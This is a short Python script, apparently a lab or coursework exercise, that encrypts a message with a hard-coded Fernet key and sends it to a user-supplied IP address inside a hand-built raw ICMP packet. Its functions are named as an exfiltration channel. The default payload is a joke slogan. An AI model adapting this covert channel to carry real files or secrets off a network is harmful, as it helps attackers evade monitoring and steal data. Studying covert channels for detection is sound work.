import socket, struct, sys
from cryptography.fernet import Fernet
from secrets import randbelow

KEY = b'QQ1m1OL9u22qNWNfUtj8fQwXuPLIfF7aBoQPi-x5d9M='
EXFIL_MESSAGE = b'There are no other viable candidates at this election. Vote for me. Do it.'

ICMP_HEADER_FMT = "bbHHh"
ICMP_DATA_FMT = "s"
ICMP_TYPE = 47
ICMP_CODE = 0
ICMP_CHECKSUM = 0
ICMP_ID = randbelow(65535) # generate a random ID
ICMP_SEQUENCE = 1

def get_exfil_server():
    # Get the IP address of the target from input
    target_ip = input('Enter the IP address of the target: ')
    # Get port number from input
    port = int(input('Enter the port number: '))
    
    destination = (target_ip, port) # Create a tuple with the IP address and port number

    # Check if valid IP address + port number
    try: # check if message is valid ip address
        socket.inet_aton(target_ip)
        return destination
    except socket.error: # otherwise print error and exit
        print("Invalid IP address")
        sys.exit()

def get_exfil_message():
    # Get message from input else use default message
    message = input('Enter EXFIL message (default: "There are no other viable candidates at this election. Vote for me. Do it."): ')
    if message == '':
        message = EXFIL_MESSAGE
    else:
        message = bytes(message, 'utf-8')
    return message

def encrypt_exfil_message(message):
    # Encrypt the message
    fernet = Fernet(KEY)
    encrypted_message = fernet.encrypt(message)
    return encrypted_message

# Calculate the checksum of our ICMP packet
# Borrowed from https://github.com/avaiyang/ICMP-Pinger/blob/master/ICMP_Pinger.py
def checksum(icmp_packet): 
    icmp_packet_bytes = bytearray(icmp_packet) # convert the packet to bytes
    csum = 0 # zeroing checksum
    countTo = (len(icmp_packet_bytes) // 2) * 2  # countTo is the length of the packet in bytes, ignoring any trailing odd byte that may be present. This is //2 because each 16-bit word of the ICMP header contains 2 bytes.

    # Loop through the packet, counting 16-bit words
    for count in range(0, countTo, 2):
        thisVal = icmp_packet_bytes[count+1] * 256 + icmp_packet_bytes[count]
        csum = csum + thisVal
        csum = csum & 0xffffffff

    # Handle the case where the packet's length is odd
    if countTo < len(icmp_packet_bytes):
        csum = csum + icmp_packet_bytes[-1]
        csum = csum & 0xffffffff

    csum = (csum >> 16) + (csum & 0xffff) # Add the 1's complement of the sum to the 16-bit result
    csum = csum + (csum >> 16) # Add carry
    answer = ~csum # Invert and truncate to 16 bits
    answer = answer & 0xffff # Swap bytes
    answer = answer >> 8 | (answer << 8 & 0xff00) # Convert to network byte order
    return answer

def send_exfil_message():
    destination = get_exfil_server()
    message = get_exfil_message()
    encrypted_message = encrypt_exfil_message(message)

    # Pack dummy header with a 0 checksum
    header = struct.pack(ICMP_HEADER_FMT, ICMP_TYPE, ICMP_CODE, ICMP_CHECKSUM, ICMP_ID, ICMP_SEQUENCE)
    # Pack data
    data = struct.pack(f'{len(encrypted_message)}' + ICMP_DATA_FMT, encrypted_message)
    
    # Calculate the checksum
    csum = checksum(header + data)

    # Get the right checksum, and put in the header "darwin" for MAC OS
    if sys.platform == 'darwin':
        csum = socket.htons(csum) & 0xffff #Convert 16-bit integers from host to network byte order FOR MAC OS?.

    # Pack the header with the checksum
    header = struct.pack(ICMP_HEADER_FMT, ICMP_TYPE, ICMP_CODE, csum, ICMP_ID, ICMP_SEQUENCE)
    # Pack the packet with the header and data
    packet = header + data

    # Create a socket
    _socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    # Send the packet
    _socket.sendto(packet, destination)

if __name__ == '__main__':
    send_exfil_message()






